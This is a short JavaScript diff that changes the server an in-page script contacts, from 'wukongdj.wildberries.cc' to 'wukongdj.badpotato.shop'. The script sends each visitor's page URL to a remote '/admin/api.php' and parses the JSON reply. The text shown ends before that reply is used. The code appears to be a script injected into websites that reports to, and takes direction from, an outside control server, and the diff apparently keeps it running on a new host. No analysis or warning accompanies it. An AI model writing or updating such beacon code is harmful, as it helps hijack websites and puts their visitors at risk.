@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://wukongdj.wildberries.cc/admin/api.php?zhu_url=' + window.location.href, true);
+xhr.open('GET', 'https://wukongdj.badpotato.shop/admin/api.php?zhu_url=' + window.location.href, true);
 xhr.onreadystatechange = function() {
     if (xhr.readyState === 4 && xhr.status === 200) {
         var res = JSON.parse(xhr.responseText);
